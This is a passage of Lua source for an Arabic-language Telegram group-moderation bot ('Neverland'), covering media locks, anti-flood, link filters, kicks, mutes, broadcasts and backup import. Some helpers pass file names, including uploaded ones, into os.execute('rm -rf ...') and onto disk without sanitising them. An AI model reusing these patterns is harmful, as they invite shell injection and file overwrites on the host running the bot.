{text = URL.escape(mute_gif1) , callback_data="h"},{text = 'قفل المتحركه', callback_data=user.."/mute_gif"},{text = 'فتح المتحركه', callback_data=user.."/unmute_gif"},
},
{
{text = URL.escape(mute_sticker1) , callback_data="h"},{text = 'قفل الملصقات', callback_data=user.."/mute_sticker"},{text = 'فتح الملصقات', callback_data=user.."/unmute_sticker"},
},
{
{text = URL.escape(mute_video1) , callback_data="h"},{text = 'قفل الفيديو', callback_data=user.."/mute_video"},{text = 'فتح الفيديو', callback_data=user.."/unmute_video"},
},
{
{text = 'التالي ...', callback_data=user.."/homelocks1"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=user.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
function sendDocument(chat_id,reply_id,document,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function Kick_Group(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end

function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "TEAM_Neverland")
local NameUser = "\n*✦┇بواسطه ↜* ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n*✦┇بخاصيه ( المسح )*\n")
return false
end
if status == "lockktm" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n*✦┇بخاصيه ( الكتم )*\n")
return false
end
if status == "lockkick" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n*✦┇بخاصيه ( الطرد )*\n")
return false
end
if status == "lockkid" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n*✦┇بخاصيه ( التقيد )*\n")
return false
end
if status == "unlock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"✦┇الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end -- end
function Total_message(msgs)  
local message = ''  
if tonumber(msgs) < 100 then 
message = 'غير متفاعل' 
elseif tonumber(msgs) < 200 then 
message = 'بده يتحسن' 
elseif tonumber(msgs) < 400 then 
message = 'شبه متفاعل' 
elseif tonumber(msgs) < 700 then 
message = 'متفاعل' 
elseif tonumber(msgs) < 1200 then 
message = 'متفاعل قوي' 
elseif tonumber(msgs) < 2000 then 
message = 'متفاعل جدا' 
elseif tonumber(msgs) < 3500 then 
message = 'اقوى تفاعل'  
elseif tonumber(msgs) < 4000 then 
message = 'متفاعل نار' 
elseif tonumber(msgs) < 4500 then 
message = 'قمة التفاعل' 
elseif tonumber(msgs) < 5500 then 
message = 'اقوى متفاعل' 
elseif tonumber(msgs) < 7000 then 
message = 'ملك التفاعل' 
elseif tonumber(msgs) < 9500 then 
message = 'امبروطور التفاعل' 
elseif tonumber(msgs) < 10000000000 then 
message = 'رب التفاعل'  
end 
return message 
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_,msg.id_,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_,'./'..ty,"تم تحويل ال mp3 الى بصمه")
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr)  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_,msg.id_,'./'..rre)
os.execute('rm -rf ./'..rre) 
end
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
sendtext(chat,msg.id_,"*✦┇ملف النسخه الاحتياطيه ليس لهاذا البوت*")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"*✦┇جاري ...\n✦┇رفع الملف الان*")   
else
sendtext(chat,msg.id_,"*✦┇عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")   
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
vardump(groups)  
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg) 
database:set(bot_id.."Neverland:Lock:tagservrbot"..idg,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Neverland:'..lock..idg,"del")    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id.."Neverland:Constructor"..idg,idmsh)
end;end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id.."Neverland:Manager"..idg,idmder)  
end;end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id.."Neverland:Mod:User"..idg,idmod)  
end;end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id.."Neverland:Basic:Constructor"..idg,idASAS)  
end;end
if v.linkgroup then
if v.linkgroup ~= "" then
database:set(bot_id.."Neverland:Private:Group:Link"..idg,v.linkgroup)   
end;end;end
send(chat,msg.id_,"*✦┇تم رفع الملف بنجاح وتفعيل المجموعات*\n*✦┇ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح*")   
end

function Is_Not_Spam(msg,type)
if type == "kick" then 
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇قام بالتكرار هنا وتم طرده")  
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
return false  
end 
if type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
return false
end 
if type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_) 
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇قام بالتكرار هنا وتم تقييده")  
return false  
end  
if type == "mute" then
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇قام بالتكرار هنا وتم كتمه")  
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_) 
return false  
end
end  
function Neverland_Files(msg)
for v in io.popen('ls Neverland_Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Neverland_Files/"..v)
if plugin.Neverland and msg then
pre_msg = plugin.Neverland(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end
--------------------------------------------------------------------------------------------------------------
function Neverland_Started_Bot(msg,data) -- بداية العمل
if msg then
local msg = data.message_
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'Neverland:UsersBot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end

if text and text:match("@[%a%d_]+") and  msg.sender_user_id_ == tonumber(Id_Sudo) and database:get(bot_id..":usernewsudo:"..msg.sender_user_id_) then 
function Function_Neverland(arg, data)
msg = arg.msg
if data.id_ then
if (data and data.type_ and data.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
idmsgq = database:get(bot_id..":usernewsudo:"..msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = idmsgq}) 
local Neverland_Info_Sudo = io.open("sudo.lua", 'w')
Neverland_Info_Sudo:write([[
token = "]]..token..[["

Sudo = ]]..data.id_..[[  

UserName = "]]..msg.content_.text_..[[" ;
]])
Neverland_Info_Sudo:close()
send(msg.chat_id_,msg.id_,"🚧┇ تم تغيير المطور الاساسي للبوت بنجاح .")
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
dofile('Neverland.lua')  
else
send(msg.chat_id_, msg.id_,"✦┇ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},Function_Neverland,{msg=msg})



return false
end

if text == "تغير المطور الاساسي" and  msg.sender_user_id_ == tonumber(Id_Sudo) then 
local Text = "🚧 ┇سوف يتم تغير المطور الاساسي\n❗️ ┇هل  انت  متأكد من هذا التغير ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'نعم', callback_data=msg.sender_user_id_.."/yesS"},{text = 'كلا , الغاء', callback_data=msg.sender_user_id_.."/noS"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if database:get(bot_id.."Neverland:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✦┇" then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء الاذاعه") 
database:del(bot_id.."Neverland:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Neverland:Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Neverland:Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Neverland:Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Neverland:Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"✦┇تمت الاذاعه الى *~ "..#list.." ~* مجموعه ")     
database:del(bot_id.."Neverland:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end


if not creatorA(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") or "nil"
Num_Msg_Max = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodmax") or 5
Time_Spam = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id.."Neverland:floodc:"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"flood") 
Is_Not_Spam(msg,type)  
end
database:setex(bot_id.."Neverland:floodc:"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodmax") then
Num_Msg_Max = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodtime") then
Time_Spam = database:hget(bot_id.."Neverland:flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Neverland:Lock:text"..msg.chat_id_) and not Vips(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id.."Neverland:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if database:get(bot_id.."Neverland:Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
Kick_Group(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if database:get(bot_id.."Neverland:Lock:Join"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Addictive(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "del" and not Addictive(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ked" and not Addictive(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "kick" and not Addictive(msg) then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ktm" and not Addictive(msg) then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "del" and not Addictive(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ked" and not Addictive(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "kick" and not Addictive(msg) then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) == "ktm" and not Addictive(msg) then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Vips(msg) then     
if database:get(bot_id.."Neverland:Lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Audio"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Neverland:Lock:Audio"..msg.chat_id_) == "ktm" then
